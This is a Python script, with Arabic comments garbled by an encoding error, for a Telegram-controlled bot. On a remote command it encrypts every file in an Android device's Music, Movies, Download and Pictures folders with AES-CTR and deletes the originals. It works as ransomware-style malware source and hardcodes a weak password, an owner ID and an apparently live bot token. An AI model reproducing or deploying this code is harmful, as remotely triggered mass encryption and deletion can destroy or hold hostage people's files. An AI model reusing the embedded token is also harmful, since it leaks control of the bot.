import os
import sys
import telebot
import hashlib
from Crypto.Cipher import AES
from Crypto.Util import Counter

# --- 1. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª ---
BOT_TOKEN = "6752223055:AAE1hbI5zx2_W3miI8IbdoqT2gMSUtmDHUA" 
OWNER_ID = 1431886140
MY_PASSWORD = "mahmoud"
CHUNK_SIZE = 64 * 1024  # Ø³Ø±Ø¹Ø© Ø¹Ø§Ù„ÙŠØ© (64KB)

# --- 2. Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø³Ø§Ø±Ø§Øª Ø§Ù„Ù…Ø³ØªÙ‡Ø¯ÙØ© (ÙƒÙ…Ø§ Ø·Ù„Ø¨ØªÙ‡Ø§) ---
TARGET_FOLDERS = [
    # Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ©
    "/storage/emulated/0/Music",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/Pictures",
    
    # Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ø§Ù„Ø®Ø§Ø±Ø¬ÙŠØ© (SD Card)
    "/storage/66D5-C18A/Download",
    "/storage/66D5-C18A/Movies",
    "/storage/66D5-C18A/Music",
    "/storage/66D5-C18A/Pictures"
]

# Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø§ØªØµØ§Ù„
try:
    bot = telebot.TeleBot(BOT_TOKEN)
except Exception as e:
    print(f"âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙˆÙƒÙ†: {e}")
    sys.exit()

# --- 3. Ù…Ø­Ø±Ùƒ Ø§Ù„ØªØ´ÙÙŠØ± Ø§Ù„Ø³Ø±ÙŠØ¹ (AES-CTR) ---
def get_key(password):
    return hashlib.sha256(password.encode()).digest()

def process_file_fast(file_path, password, mode):
    try:
        key = get_key(password)
        if mode == "encrypt":
            # ØªØ´ÙÙŠØ±
            iv = os.urandom(16)
            ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
            cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
            output_path = file_path + ".aboelfadl"
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                outfile.write(iv)
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.encrypt(chunk))
            os.remove(file_path)

        elif mode == "decrypt":
            # ÙÙƒ ØªØ´ÙÙŠØ±
            if not file_path.endswith(".aboelfadl"): return False
            output_path = file_path.replace(".aboelfadl", "")
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                iv = infile.read(16)
                ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
                cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.decrypt(chunk))
            os.remove(file_path)
            
        return True
    except Exception as e:
        print(f"Error processing {file_path}: {e}")
        return False

# --- 4. Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© ÙƒØ§Ù…Ù„Ø© ---
def execute_all_targets(mode):
    total_files = 0
    processed_folders = []
    
    action = "ØªØ´ÙÙŠØ± ğŸ”’" if mode == "encrypt" else "ÙÙƒ ØªØ´ÙÙŠØ± ğŸ”“"
    bot.send_message(OWNER_ID, f"âš¡ Ø¬Ø§Ø±ÙŠ {action} Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¬Ù„Ø¯Ø§Øª Ø§Ù„Ù…Ø­Ø¯Ø¯Ø©...")

    for folder in TARGET_FOLDERS:
        if os.path.exists(folder):
            local_count = 0
            # Ø§Ù„Ù…Ø±ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„Ù…Ù„ÙØ§Øª Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…Ø¬Ù„Ø¯
            for root, dirs, files in os.walk(folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    if mode == "encrypt" and not file.endswith(".aboelfadl"):
                        if process_file_fast(file_path, MY_PASSWORD, "encrypt"):
                            local_count += 1
                    
                    elif mode == "decrypt" and file.endswith(".aboelfadl"):
                        if process_file_fast(file_path, MY_PASSWORD, "decrypt"):
                            local_count += 1
            
            if local_count > 0:
                total_files += local_count
                folder_name = folder.split("/")[-1] # Ø§Ø³Ù… Ø§Ù„Ù…Ø¬Ù„Ø¯ ÙÙ‚Ø· Ù„Ù„Ø¹Ø±Ø¶
                processed_folders.append(f"{folder_name}: {local_count}")
        else:
            print(f"ØªÙ†Ø¨ÙŠÙ‡: Ø§Ù„Ù…Ø¬Ù„Ø¯ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯ {folder}")

    # ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ù‡Ø§ÙŠØ©
    report = "\n".join(processed_folders)
    if not report: report = "Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ù…Ù„ÙØ§Øª."
    
    return f"âœ… ØªÙ…Øª Ø¹Ù…Ù„ÙŠØ© {action} Ø¨Ù†Ø¬Ø§Ø­!\n\nğŸ“‚ Ø§Ù„ØªÙØ§ØµÙŠÙ„:\n{report}\n\nğŸ“Š Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: {total_files} Ù…Ù„Ù."

# --- 5. Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ø¨ÙˆØª ---
@bot.message_handler(commands=['secure'])
def cmd_encrypt(message):
    if message.from_user.id == OWNER_ID:
        res = execute_all_targets("encrypt")
        bot.send_message(OWNER_ID, res)

@bot.message_handler(commands=['unlock'])
def cmd_decrypt(message):
    if message.from_user.id == OWNER_ID:
        res = execute_all_targets("decrypt")
        bot.send_message(OWNER_ID, res)

# --- 6. Ø§Ù„ØªØ±Ø­ÙŠØ¨ ÙˆØ§Ù„ØªØ´ØºÙŠÙ„ ---
def send_welcome():
    msg = (
        "ğŸŸ¢ *AboElfadl Multi-Path Bot*\n\n"
        "ØªÙ… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…Ø¬Ù„Ø¯Ø§Øª Ø§Ù„Ù…Ø³ØªÙ‡Ø¯ÙØ© (Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ© + SD Card).\n"
        "Ø§Ù„Ù…Ø³Ø§Ø±Ø§Øª Ø§Ù„Ù…Ø´Ù…ÙˆÙ„Ø©:\n"
        "ğŸ“ Music, Movies, Download, Pictures\n\n"
        "Ø§Ù„Ø£ÙˆØ§Ù…Ø±:\n"
        "/secure - ØªØ´ÙÙŠØ± Ø§Ù„ÙƒÙ„\n"
        "/unlock - Ø§Ø³ØªØ¹Ø§Ø¯Ø© Ø§Ù„ÙƒÙ„"
    )
    try:
        bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
    except: pass

if __name__ == "__main__":
    print("ğŸš€ Bot Started (Targeting Specific Folders)...")
    send_welcome()
    bot.infinity_polling()